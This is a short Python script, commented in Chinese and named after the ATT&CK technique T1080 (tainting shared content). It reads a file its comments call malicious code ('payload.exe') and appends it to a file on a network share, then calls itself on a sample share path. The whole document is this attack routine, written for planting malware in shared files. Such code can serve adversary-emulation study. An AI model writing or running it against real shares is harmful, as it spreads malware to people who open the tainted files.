import os

def t1080_exec(payload_path, target_path):
    # 讀取惡意程式碼
    with open(payload_path, 'rb') as f:
        payload = f.read()

    # 將惡意程式碼寫入目標檔案
    with open(target_path, 'ab') as f:
        f.write(payload)

    print("惡意程式碼已寫入檔案:", target_path)

# 測試
t1080_exec('payload.exe', '\\\\network\\shared\\file.txt')